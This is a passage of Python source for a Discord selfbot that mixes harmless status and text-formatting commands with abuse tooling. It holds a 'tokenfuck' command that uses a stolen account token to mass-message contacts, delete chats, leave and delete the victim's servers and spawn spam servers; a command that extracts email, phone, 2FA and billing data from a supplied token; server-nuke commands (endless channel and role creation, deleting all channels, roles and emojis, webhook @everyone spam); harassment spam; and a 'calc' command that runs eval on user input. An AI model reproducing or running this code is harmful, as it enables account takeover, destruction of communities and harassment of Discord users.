        f"Total Messages Deleted: {total_messages}"
    )
    await msg.edit(content=final_message, delete_after=15)

@bot.command(name='deletemessagesafter')
async def toggle_delete(ctx, option: str):
    global delete_bot_messages

    if option.lower() == 'on':
        delete_bot_messages = True
        await ctx.send("Bot message deletion is now **enabled**.")
    elif option.lower() == 'off':
        delete_bot_messages = False
        await ctx.send("Bot message deletion is now **disabled**.")
    else:
        await ctx.send("Please use `on` or `off` to toggle the deletion feature.")

@bot.command(aliases=['reactspam', 'massreact'])
async def spamreact(ctx, message_id: int, count: int = 1):
    
    reactions = ["😔", "😳", "😂", "🤣", "😊", "😼", "😈", "🎉", "💔", "🍰", "😍"]
    try:
        message = await ctx.channel.fetch_message(message_id)
        for _ in range(count):
            for reaction in reactions:
                try:
                    await message.add_reaction(reaction)
                except discord.Forbidden:
                    print(f"Cannot add reaction to message {message.id}: Missing permissions.")
                except discord.HTTPException as e:
                    print(f"Failed to add reaction to message {message.id}: {e}")
        await ctx.send(f"Reacted to message {message_id} with {count} reactions.")
    except discord.NotFound:
        await ctx.send(f"**Error:** Message with ID {message_id} not found.")
    except Exception as e:
        print(f"An error occurred: {e}")
        await ctx.send(f"**Error:** {str(e)}")

@bot.command(name='watch')
async def watch(ctx, *, status: str):
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=status))
    await ctx.send(f"Changed status to **watching**: {status}")

@bot.command(name='listen')
async def listen(ctx, *, status: str):
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=status))
    await ctx.send(f"Changed status to **listening**: {status}")

@bot.command(name='game')
async def game(ctx, *, status: str):
    await bot.change_presence(activity=discord.Game(name=status))
    await ctx.send(f"Changed status to **playing**: {status}")

@bot.command(aliases=['streamurl'])
async def twitchurl(ctx, streamurltouse: str):
    global streamurl
    streamurl = streamurltouse
    response = (
        f"**Stream URL Changed**\n"
        f"Stream URL is now: `{streamurl}`\n"
        f"Try `{ctx.prefix}stream` or `{ctx.prefix}streamcycle`"
    )

    await ctx.send(response)

@bot.command(name='stream')
async def stream(ctx, status: str):
    global streamurl
    if streamurl:
        await bot.change_presence(activity=discord.Streaming(name=status, url=streamurl))
        await ctx.send(f"Changed status to **streaming**: {status} (URL: {streamurl})")
    else:
        await ctx.send(f"Please set a Twitch URL first using `{prefix}twitchurl [url]`.")

@bot.command()
async def setstatus(ctx, emoji: str, *, status_msg: str):
    emoji_id = None
    emoji_name = None
    if emoji.startswith('<:') and emoji.endswith('>'):
        emoji_name, emoji_id = emoji[2:-1].split(':')
        emoji_id = int(emoji_id)
    elif emoji.startswith('<a:') and emoji.endswith('>'):
        emoji_name, emoji_id = emoji[3:-1].split(':')
        emoji_id = int(emoji_id)
    payload = {"text": status_msg, "emoji_name": emoji_name if emoji_id else None, "emoji_id": emoji_id}
    headers = {"Authorization": token, "Content-Type": "application/json"}
    response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={"status": "idle", "custom_status": payload})
    if response.status_code == 200:
        await ctx.send("Status updated successfully!")
    else:
        await ctx.send(f"Failed to update status: {response.text}") 

############################################
#            Emoji Commands                #
############################################
@bot.command()
async def addemoji(ctx, emoji: str):
    if emoji.startswith('<:') and emoji.endswith('>'):
        emoji_name, emoji_id = emoji[2:-1].split(':')
        emoji_id = int(emoji_id)
        await ctx.send(f"Emoji {emoji_name} added with ID {emoji_id}!")
    else:
        await ctx.send("Please provide a valid custom emoji.")

@bot.command()
async def bigemoji(ctx, emoji: str):
    if emoji.startswith('<:') and emoji.endswith('>'):
        emoji_name, emoji_id = emoji[2:-1].split(':')
        emoji_id = int(emoji_id)
        await ctx.send(f"Big emoji created: {emoji_name}!")
    else:
        await ctx.send("Please provide a valid custom emoji.")

@bot.command()
async def downloadguildemojis(ctx, guild_id: int):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/emojis", headers=headers)

    if response.status_code == 200:
        emojis = response.json()
        for emoji in emojis:
            emoji_url = f"https://cdn.discordapp.com/emojis/{emoji['id']}.png?v=1"
            await ctx.send(emoji_url)  
    else:
        await ctx.send("Failed to download emojis.")

@bot.command()
async def stealguildemoji(ctx, guild_id: int):
    headers = {"Authorization": token,"Content-Type": "application/json"}
    response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/emojis", headers=headers)
    if response.status_code == 200:
        emojis = response.json()
        if emojis:
            for emoji in emojis:
                await ctx.send(f"Stole emoji: {emoji['name']}!")
        else:
            await ctx.send("No emojis found in that guild.")
    else:
        await ctx.send("Failed to steal emojis.")

############################################
#              Mod Commands                #
############################################
@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: commands.MemberConverter, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f"Kicked {member.mention} for reason: {reason or 'No reason provided'}")

@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: commands.MemberConverter, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f"Banned {member.mention} for reason: {reason or 'No reason provided'}")

@bot.command()
@commands.has_permissions(ban_members=True)
async def banid(ctx, user_id: int, *, reason=None):
    member = ctx.guild.get_member(user_id)
    if member:
        await member.ban(reason=reason)
        await ctx.send(f"Banned {member.mention} for reason: {reason or 'No reason provided'}")
    else:
        await ctx.send("User not found in the guild.")

@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, user_id: int):
    user = await bot.fetch_user(user_id)
    await ctx.guild.unban(user)
    await ctx.send(f"Unbanned {user.mention}.")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def nuke(ctx):
    channel = ctx.channel
    new_channel = await channel.clone()
    await channel.delete()
    await new_channel.send("This channel has been nuked!")

@bot.command(aliases=["purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass
############################################
#              Snipe Commands              #
############################################
@bot.event
async def on_message_delete(message):
    deleted_messages[message.channel.id] = (message.content, message.author)

@bot.command()
async def snipe(ctx):
    if ctx.channel.id in deleted_messages:
        content, author = deleted_messages[ctx.channel.id]
        await ctx.send(f"**{author}**: {content}")
    else:
        await ctx.send("No messages to snipe!")

@bot.command(aliases=['nitrosniper', 'snipenitro'])
async def nitrosnipe(ctx, snipestatus=None):
    global nitrosniping 
    if snipestatus is None:
        nitrosniping = "on" if nitrosniping == "off" else "off"
    else:
        if snipestatus.lower() in ["off", "false"]:
            nitrosniping = "off"
        elif snipestatus.lower() in ["on", "true"]:
            nitrosniping = "on"
    await ctx.message.edit(content=f" - Nitro Sniper\nNitro sniper is now: `{nitrosniping}`")

@bot.command(aliases=['giveawaysniper', 'snipegiveaway', 'snipegw', 'gwsniper'])
async def giveawaysnipe(ctx, snipestatus=None):
    global giveawaysniping
    if snipestatus is None:
        giveawaysniping = "on" if giveawaysniping == "off" else "off"
    else:
        if snipestatus.lower() in ["off", "false"]:
            giveawaysniping = "off"
        elif snipestatus.lower() in ["on", "true"]:
            giveawaysniping = "on"
    response_message = (f"Giveaway sniper is now: `{giveawaysniping}`")
    await ctx.send(response_message)

############################################
#               Nuke Commands              #
############################################

@bot.command()
@commands.has_permissions(kick_members=True)
async def prune(ctx, days: int):
    try:
        pruned_count = await ctx.guild.prune_members(days=days)
        await ctx.send(f"Pruned {pruned_count} members who were inactive for {days} days.")
    except discord.Forbidden:
        await ctx.send("I do not have permission to kick members.")
    except discord.HTTPException as e:
        await ctx.send(f"Failed to prune members: {e}")

@bot.command()
async def channelspam(ctx, name: str):
    while True:
        await ctx.guild.create_text_channel(f"{name}")

@bot.command()
async def deletechannels(ctx):
    channels = ctx.guild.text_channels
    for channel in channels:
        await channel.delete()

@bot.command()
async def rolespam(ctx, name: str):
    while True:
        await ctx.guild.create_role(name=f"{name}")

@bot.command()
async def deleteroles(ctx):
    guild = ctx.guild
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"Deleted role: {role.name}")
            except discord.Forbidden:
                print(f"Cannot delete role: {role.name}, missing permissions.")
            except discord.HTTPException as e:
                print(f"An error occurred while deleting {role.name}: {e}")
    await ctx.send("Deleted all custom roles.")

@bot.command()
async def emojinuke(ctx):
    emojis = ctx.guild.emojis
    for emoji in emojis:
        await emoji.delete()

@bot.command()
async def webhookspam(ctx):
    guild = ctx.guild
    for channel in guild.text_channels:
        if isinstance(channel, discord.TextChannel):  
            try:
                webhook = await channel.create_webhook(name=f'{bot_name}')
                print(f'Created webhook in {channel.name}: {webhook.url}')
                await webhook.send(content=f'@everyone nuked by {bot_name}')
            except discord.Forbidden:
                print(f'No permission to create webhook in {channel.name}')
            except discord.HTTPException:
                print(f'Failed to create webhook in {channel.name}')

@bot.command()
async def stopwebhookspam(ctx):
    await ctx.send(f"{prefix}restart", delete_after=1)

@bot.command(aliases=["infotoken"])
async def tokeninfo(ctx, bokenxd):
    
    data = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': bokenxd, 'Content-Type': 'application/json'})
    if data.status_code == 200:
        j = data.json()
        name = f'{j["username"]}#{j["discriminator"]}'
        userid = j['id']
        avatar = f"https://cdn.discordapp.com/avatars/{j['id']}/{j['avatar']}.webp"
        phone = j['phone']
        isverified = j['verified']
        email = j['email']
        twofa = j['mfa_enabled']
        flags = j['flags']
        creation_date = datetime.utcfromtimestamp(((int(userid) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        user_info = (
            f"Token info:\n"
            f"User: `{name}`\n"
            f"User-id: `{userid}`\n"
            f"Avatar url: `{avatar}`\n"
            f"Phone number linked: `{phone}`\n"
            f"Email verification status: `{isverified}`\n"
            f"Email linked: `{email}`\n"
            f"2F/A Status: `{twofa}`\n"
            f"Flags: `{flags}`"
        )
        message = await ctx.send(user_info)
        datahmm = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers={'Authorization': bokenxd, 'Content-Type': 'application/json'})
        nitro_data = datahmm.json()
        nitroyems = bool(len(nitro_data) > 0)
        if nitroyems:
            end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            totalnitro = abs((start - end).days)
            nitro_info = (
                f"Nitro Data:\n"
                f"Had nitro since: `{end}`\n"
                f"Nitro ends on: `{start}`\n"
                f"Total nitro: `{totalnitro}`"
            )
            await message.edit(content=user_info + "\n\n" + nitro_info)
    else:
        error_info = (
            f"Site responded with status code: `{data.status_code}`\n"
            f"Message: `{data.text}`"
        )
        await ctx.send(error_info)

async def send_friend_request(session, boken, user_id):
    async with session.put(f'https://discord.com/api/v10/users/@me/relationships/{user_id}', headers={
        "Content-Type": "application/json",
        'Authorization': boken,
    }, json={}) as req_response:
        if req_response.status == 204:  
            return f'Sent friend request to user ID: {user_id}'
        elif req_response.status == 403:
            return f'Error: CAPTCHA required when sending friend request to user ID: {user_id}'
        else:
            error_message = await req_response.text()
            return f'Failed to send friend request to user ID: {user_id}: {req_response.status} {error_message}'

@bot.command()
async def send_friends(ctx, boken: str):
    user_ids_file = 'friends_scrape.txt'  
    async with aiohttp.ClientSession() as session:
        with open(user_ids_file, 'r') as file:
            user_ids = [335812165292261378, 1166774799180251198, 773849193587539968, 435980435516817439]
        for user_id in user_ids:
            response = await send_friend_request(session, token, user_id)
            await ctx.send(response)

def makeguildxd(tokentouse,nukemsg):
    global serversmade
    data = {
    "name": nukemsg
    }
    headers={"authorization": tokentouse}
    servercreation = requests.post("https://discord.com/api/v8/guilds/templates/GC9sXUCX85P8",headers=headers,json=data).status_code
    if servercreation == 201:
        serversmade += 1

@bot.command(aliases=['tokenfuck', "tockenfuck", "fucktocken", "accountfuck", "fuckaccount"])
async def fucktoken(ctx, tokentofrick=None, *, nukemsg=f"{bot_name}"):
    global serversmade
    serversmade = 0
    
    if tokentofrick is None:
        await ctx.send(f"**Token Fuck**\nSupply a token - `{prefix.strip()}tokenfuck [token-here] [message-to-nuke-with]`")
        return
    elif ctx.guild is None:
        await ctx.send("**Token Fuck**\nTry doing this command in a private server - it has problems in DMs!")
        return
    else:
        message = await ctx.send(f"**Token Fuck**\nIf you're sure you want to token fuck the account, react with the emoji below.\nThis process will DM all open DMs, then close them, leave all servers, and make a ton of servers.")
        await message.add_reaction('✅')
        reactionstuffyes = True
        def requirements(reaction, user):
            return user == ctx.author and str(reaction.emoji) == '✅' and message.id == message.id
        while reactionstuffyes:
            try:
                reaction, user = await bot.wait_for('reaction_remove', timeout=10, check=requirements)
                await message.edit(content=f"**Token Fuck**\nYou reacted, the process has started!\nValidating token...")
                await message.clear_reactions()
                reactionstuffyes = False
                headers = {"authorization": tokentofrick}
                tokendata = requests.get("https://discord.com/api/v8/users/@me", headers=headers)
                if tokendata.status_code != 200:
                    await message.edit(content=f"**Token Fuck**\nError - are you sure that token is correct?\nDiscord responded with: `{tokendata.text}`")
                else:
                    await message.edit(content=f"**Token Fuck**\nToken valid - continuing the process")
                    resp = requests.get("https://discord.com/api/v8/users/@me/channels", headers=headers)
                    data = json.loads(resp.text)
                    usersmessaged = 0
                    for channel in data:
                        messagesent = requests.post(f"https://discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json={"content": nukemsg})
                        if messagesent.status_code == 200:
                            usersmessaged += 1
                        else:
                            await asyncio.sleep(1)
                        requests.delete(f"https://discord.com/api/v8/channels/{channel['id']}", headers=headers)
                    await message.edit(content=f"**Token Fuck**\nMessaged {usersmessaged} people saying: `{nukemsg}` and cleared the conversation after")
                    resp = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers)
                    data = json.loads(resp.text)
                    serversleft = 0
                    for guild in data:
                        serverleaving = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{guild['id']}", headers=headers).status_code
                        if serverleaving == 204:
                            serversleft += 1
                        else:
                            await asyncio.sleep(1)
                    await message.edit(content=f"**Token Fuck**\nLeft `{serversleft}` servers")
                    resp = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers)
                    data = json.loads(resp.text)
                    serversdeleted = 0
                    for guild in data:
                        servdel = requests.post(f"https://discord.com/api/v8/guilds/{guild['id']}/delete", headers=headers, json={}).status_code
                        if servdel == 204:
                            serversdeleted += 1
                        else:
                            await asyncio.sleep(1)
                    await message.edit(content=f"**Token Fuck**\nDeleted `{serversdeleted}` servers")
                    for _ in range(100):
                        threading.Thread(target=makeguildxd, args=(tokentofrick, nukemsg)).start()
                        await asyncio.sleep(1)
                    await message.edit(content=f"**Token Fuck**\nMade {serversmade} servers")
                    await asyncio.sleep(3)
                    await message.edit(content=f"**Overall results**:\nMessaged `{usersmessaged}` people with `{nukemsg}` and deleted the conversation.\nLeft `{serversleft}` servers\nDeleted `{serversdeleted}` servers\nMade `{serversmade}` servers")
            except asyncio.TimeoutError:
                await message.edit(content=f"**Token Fuck**\nYou took too long - run this command again if you wish to token fuck an account.")
                await message.clear_reactions()
                reactionstuffyes = False

############################################
#                Fun Commands              #
############################################

@bot.command()
async def name(ctx, *, name: str):
    await ctx.send(f"Your name is: {name}")

@bot.command()
async def nitro(ctx):
    await ctx.send("Here's a link to Nitro: https://discord.com/nitro")

@bot.command()
async def impersonate(ctx, user: discord.User, *, message: str):
    await ctx.send(f"{user.name} says: {message}")

@bot.command()
async def www(ctx, user: discord.User):
    await ctx.send(f"Check out {user.mention}'s profile: https://discord.com/users/{user.id}")

@bot.command()
async def stickbug(ctx, user: discord.User):
    await ctx.send(f"{user.mention} has been stickbugged! 🕺 [Link to Stickbug](https://www.youtube.com/watch?v=hZfYw0MAYfI)")

@bot.command()
async def tweet(ctx, user: discord.User, *, message: str):
    await ctx.send(f"{user.name} tweets: {message}")

@bot.command()
async def blurpify(ctx, user: discord.User):
    await ctx.send(f"{user.mention} has been blurpified! 🗯️")

@bot.command()
async def magic(ctx, user: discord.User):
    await ctx.send(f"{user.mention} performs a magic trick! 🎩✨")

@bot.command()
async def deepfry(ctx, user: discord.User):
    await ctx.send(f"{user.mention}'s picture has been deep fried! 🔥 (This is a placeholder response)")

@bot.command()
async def captcha(ctx, user: discord.User):
    await ctx.send(f"{user.mention}, please complete the captcha! 🔒 [Link to Captcha](https://example.com/captcha)")

@bot.command()
async def threat(ctx, user: discord.User):
    await ctx.send(f"{user.mention} has issued a threat! ⚠️")

@bot.command()
async def iphone(ctx, user: discord.User):
    await ctx.send(f"{user.mention} just got a new iPhone! 📱")

@bot.command()
async def ship(ctx, user: discord.User):
    ships = ["❤️", "💔", "💞", "💓", "💖"]
    await ctx.send(f"{user.mention}, you are now officially shipped! {random.choice(ships)}")

@bot.command()
async def encrypt(ctx, *, message: str):
    encoded_message = base64.b64encode(message.encode()).decode()
    await ctx.send(f"Encrypted message: `{encoded_message}`")

@bot.command()
async def decrypt(ctx, *, message: str):
    try:
        decoded_message = base64.b64decode(message.encode()).decode()
        await ctx.send(f"Decrypted message: `{decoded_message}`")
    except Exception:
        await ctx.send("Failed to decrypt the message. Please ensure it is valid Base64.")

@bot.command()
async def tokenhalf(ctx, user: discord.User):
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    half_token = token[:len(token)//2]  
    await ctx.send(f"Half of {user.name}'s token: `{half_token}`")

@bot.command()
async def vcspam(ctx, vc_id_one: int, vc_id_two: int, user_id: int, amount: int):
    try:
        channel_one = bot.get_channel(vc_id_one)
        channel_two = bot.get_channel(vc_id_two)
        if isinstance(channel_one, discord.VoiceChannel) and isinstance(channel_two, discord.VoiceChannel):
            user = ctx.guild.get_member(user_id)
            if user:
                for _ in range(amount):
                    await user.move_to(channel_one)
                    await user.move_to(channel_two)
                await ctx.send(f"Spammed {user.name} between {channel_one.name} and {channel_two.name}!")
            else:
                await ctx.send("User not found.")
        else:
            await ctx.send("One of the provided IDs does not correspond to a voice channel.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")
@bot.command()
async def spampin(ctx, amount: int):
    for _ in range(amount):
        message = await ctx.send("This is a pinned message!")
        await message.pin()
        await asyncio.sleep(1)  

@bot.command()
async def spamedit(ctx, amount: int, *, new_message: str):
    message = await ctx.send("This message will be edited.")
    for _ in range(amount):
        await message.edit(content=new_message)
        await asyncio.sleep(1)  

@bot.command()
async def spam(ctx, amount: int, *, message: str):
    for _ in range(amount):
        await ctx.send(message)
        await asyncio.sleep(1) 

@bot.command()
async def qr(ctx, *, message: str):
    qr_img = qrcode.make(message)
    with io.BytesIO() as buf:
        qr_img.save(buf, 'PNG')
        buf.seek(0)
        await ctx.send(file=discord.File(buf, 'qr_code.png'))

############################################
#                Fun Commands              #
############################################

@bot.command(aliases=["tableflip","flip"])
async def fliptable(ctx,*,message=""):
    await ctx.message.edit(content=f"{message} (╯°□°）╯︵ ┻━┻")

@bot.command(aliases=["untableflip","tableunflip","unfliptable"])
async def unflip(ctx,*,message=""):
    await ctx.message.edit(content=f"{message} (╯°□°）╯︵ ┳━┳")

@bot.command(aliases=["tw"])
async def spoiler(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"||{message}||")

@bot.command(aliases=["ul","line"])
async def underline(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"__{message}__")

@bot.command()
async def bold(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"**{message}**")

@bot.command()
async def italic(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"_{message}_")

@bot.command()
async def block(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```\n{message}```")

@bot.command(aliases=["redblock"])
async def redtext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```diff\n- {message}```")

@bot.command(aliases=["orangeblock"])
async def orangetext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```css\n[{message}]```")

@bot.command(aliases=["yellowblock"])
async def yellowtext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```fix\n{message}```")

@bot.command(aliases=["greenblock"])
async def greentext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```diff\n+{message}```")

@bot.command(aliases=["lightgreenblock"])
async def lightgreentext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```css\n\"{message}\"```")

@bot.command(aliases=["cyanblock"])
async def cyantext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```json\n\"{message}\"```")  

@bot.command(aliases=["blueblock"])
async def bluetext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```ini\n[{message}]```")

@bot.command(aliases=['haste', 'paste'])
async def hastebin(ctx, *, paste: str = "Format is !hastebin [text]"):
    try:
        data = requests.post("https://hastebin.com/documents", timeout=3, data=paste).text
        textlink = "https://hastebin.com/"
    except requests.RequestException: 
        await ctx.send("_Hastebin is having problems - switching to Python Discord Paste._")
        await asyncio.sleep(1)
        data = requests.post("https://paste.pythondiscord.com/documents", data=paste).text
        textlink = "https://paste.pythondiscord.com/"
    j = json.loads(data)
    endoflink = j['key']
    response_message = f"Here's your paste!\n{textlink}{endoflink}"
    await ctx.send(response_message)

############################################
#              Vouch Commands              #
############################################

@bot.command()
async def done(ctx, user: discord.User, amount: str, *, infosex: str):
    currency = amount[-1]
    if currency not in ('$','€'):
        await ctx.send("**Error:** Please provide a valid amount with a currency symbol ($ or €).")
        await ctx.send("**Correct Format:** `!done @user <amount> <product>`")
        return
    try:
        float_amount = float(amount[:-1])
    except ValueError:
        await ctx.send("**Error:** Please provide a valid amount (numeric value).")
        await ctx.send("**Correct Format:** `!done @user <amount> <product>`")
        return
    if float_amount > 9999:
        await ctx.send("**Error:** The maximum amount allowed is 9999.")
        return
    await ctx.send(f"Deal confirmed! Amount: `{amount}`. Thank you, {user.name}!")
    sax = await ctx.send(f"+rep {ctx.author.id} Legit got {infosex} for [{amount}]")
    await sax.reply(f'> **Please Vouch me in Server Below\n> No Vouch = No Warranty of Product \n> Ty For buying**\n\n{SERVER_Link}')

############################################
#             Crypto Commands              #
############################################

def fetch_balance(crypto, address):
    if crypto.lower() == 'btc':
        url = f'https://api.blockchain.info/q/addressbalance/{address}'
        response = requests.get(url)
        if response.status_code == 200:
            return response.json() / 1e8
    elif crypto.lower() == 'eth':
        url = f'https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey=YOUR_ETHERSCAN_API_KEY'
        response = requests.get(url)
        if response.status_code == 200:
            return int(response.json()['result']) / 1e18  
    elif crypto.lower() == 'ltc':
        url = f'https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance'
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()['final_balance'] / 1e8  
    elif crypto.lower() == 'usdt':
        url = f'https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=YOUR_USDT_CONTRACT_ADDRESS&address={address}&tag=latest&apikey=YOUR_ETHERSCAN_API_KEY'
        response = requests.get(url)
        if response.status_code == 200:
            return int(response.json()['result']) / 1e6 
    return None 

def fetch_conversion_rates():
    try:
        response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=inr')
        data = response.json()
        ltc_price_inr = data['litecoin']['inr']

        conversion_rates = {
            'LTC': ltc_price_inr,
        }
        return conversion_rates
    except Exception as e:
        print(f"Error fetching conversion rates: {e}")
        return None

@bot.command()
async def calc(ctx, *, expression: str):
    try:
        # Evaluate the expression safely (using eval or a safer alternative)
        result = eval(expression)
        await ctx.send(f"The result of `{expression}` is: {result}")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def price(ctx):
    rates = fetch_conversion_rates()
    if rates:
        price = rates['LTC']
        await ctx.send(f"The current price of Litecoin (LTC) is ₹{price}.")
    else:
        await ctx.send("Failed to fetch conversion rates.")

@bot.command(name='i2c')
async def i2c(ctx, amount: float):
    rates = fetch_conversion_rates()
    if rates:
        ltc_amount = amount / rates['LTC']
        await ctx.send(f"₹{amount} is equivalent to {ltc_amount:.6f} LTC.")
    else:
        await ctx.send("Failed to fetch conversion rates.")

@bot.command(name='c2i')
async def c2i(ctx, amount: float):
    rates = fetch_conversion_rates()
    if rates:
        ltc_value_inr = amount * rates['LTC']
        await ctx.send(f"{amount} LTC is worth ₹{ltc_value_inr}.")
    else:
        await ctx.send("Failed to fetch conversion rates.")

############################################
#              Guild Commands              #
############################################

@bot.command()
async def cchannels(ctx, old_server_id: int, new_server_id: int):
    
    old_server = bot.get_guild(old_server_id)
    new_server = bot.get_guild(new_server_id)
    if not old_server:
        await ctx.send('`` **Old server not found.**')
        return
    if not new_server:
        await ctx.send('`` **New server not found.**')
        return
    category_map = {}
    clone_messages = [] 
    for old_category in old_server.categories:
        new_category = await new_server.create_category_channel(name=old_category.name, overwrites=old_category.overwrites)
        category_map[old_category.id] = new_category
        for old_text_channel in old_category.text_channels:
            new_text_channel = await new_category.create_text_channel(name=old_text_channel.name, overwrites=old_text_channel.overwrites)
            clone_messages.append(f'Text channel cloned: {old_text_channel.name} -> {new_text_channel.name} in category: {old_category.name} -> {new_category.name}')
        for old_voice_channel in old_category.voice_channels:
            new_voice_channel = await new_category.create_voice_channel(name=old_voice_channel.name, overwrites=old_voice_channel.overwrites)
            clone_messages.append(f'Voice channel cloned: {old_voice_channel.name} -> {new_voice_channel.name} in category: {old_category.name} -> {new_category.name}')
    for old_channel in old_server.channels:
        if isinstance(old_channel, (discord.TextChannel, discord.VoiceChannel)) and old_channel.category is None:
            if isinstance(old_channel, discord.TextChannel):
                new_channel = await new_server.create_text_channel(name=old_channel.name, overwrites=old_channel.overwrites)
                clone_messages.append(f'Text channel cloned: {old_channel.name} (No Category) -> {new_channel.name}')
            elif isinstance(old_channel, discord.VoiceChannel):
                new_channel = await new_server.create_voice_channel(name=old_channel.name, overwrites=old_channel.overwrites)
                clone_messages.append(f'Voice channel cloned: {old_channel.name} (No Category) -> {new_channel.name}')
    for message in clone_messages:
        print(message)
    await ctx.send("`` **Channels cloned successfully!**")

@bot.command()
async def croles(ctx, old_server_id: int, new_server_id: int):
    
    old_server = bot.get_guild(old_server_id)
    new_server = bot.get_guild(new_server_id)
    if old_server is None:
        await ctx.send(" **The old server does not exist.**")
        return
    if new_server is None:
        await ctx.send("**The new server does not exist.**")
        return
    old_roles = old_server.roles
    role_map = {}
    clone_messages = []  
    for role in reversed(old_roles):
        new_role = await new_server.create_role(name=role.name, color=role.color, hoist=role.hoist,
                                               mentionable=role.mentionable, permissions=role.permissions,
                                               reason="Cloning roles")
        role_map[role.id] = new_role
        clone_messages.append(f'Role cloned: {role.name} -> {new_role.name}')
        print(f'Role cloned: {role.name} -> {new_role.name}')

    for member in old_server.members:
        member_roles = member.roles
        new_member = new_server.get_member(member.id)
        if new_member is not None:
            for role in reversed(member_roles):
                if role.id in role_map:
                    new_role = role_map[role.id]
                    await new_member.add_roles(new_role)
    await ctx.send(" **Roles have been cloned successfully!**")

@bot.command()
async def cserver(ctx, source_guild_id: int, target_guild_id: int):
    source_guild = bot.get_guild(source_guild_id)
    target_guild = bot.get_guild(target_guild_id)
    if not source_guild or not target_guild:
        await ctx.send("`-` Guild Not Found")
        return
    for channel in target_guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0)
        except Exception as e:
            print(f"{e}")
    for role in target_guild.roles:
        if role.name not in ["here", "@everyone"]:
            try:
                await role.delete()
                await asyncio.sleep(0)
            except Exception as e:
                print(f"{e}")
    roles = sorted(source_guild.roles, key=lambda role: role.position)

    for role in roles:
        try:
            new_role = await target_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
            await asyncio.sleep(0)
            for perm, value in role.permissions:
                await new_role.edit_permissions(target_guild.default_role, **{perm: value})
        except Exception as e:
            print(f"{e}")
    text_channels = sorted(source_guild.text_channels, key=lambda channel: channel.position)
    voice_channels = sorted(source_guild.voice_channels, key=lambda channel: channel.position)
    category_mapping = {} 
    for channel in text_channels + voice_channels:
        try:
            if channel.category:
                if channel.category.id not in category_mapping:
                    category_perms = channel.category.overwrites
                    new_category = await target_guild.create_category_channel(name=channel.category.name, overwrites=category_perms)
                    category_mapping[channel.category.id] = new_category
                if isinstance(channel, discord.TextChannel):
                    new_channel = await new_category.create_text_channel(name=channel.name)
                elif isinstance(channel, discord.VoiceChannel):
                    existing_channels = [c for c in new_category.channels if isinstance(c, discord.VoiceChannel) and c.name == channel.name]
                    if existing_channels:
                        new_channel = existing_channels[0]
                    else:
                        new_channel = await new_category.create_voice_channel(name=channel.name)
                for overwrite in channel.overwrites:
                    if isinstance(overwrite.target, discord.Role):
                        target_role = target_guild.get_role(overwrite.target.id)
                        if target_role:
                            await new_channel.set_permissions(target_role, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))
                    elif isinstance(overwrite.target, discord.Member):
                        target_member = target_guild.get_member(overwrite.target.id)
                        if target_member:
                            await new_channel.set_permissions(target_member, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))
                await asyncio.sleep(0) 
            else:
                if isinstance(channel, discord.TextChannel):
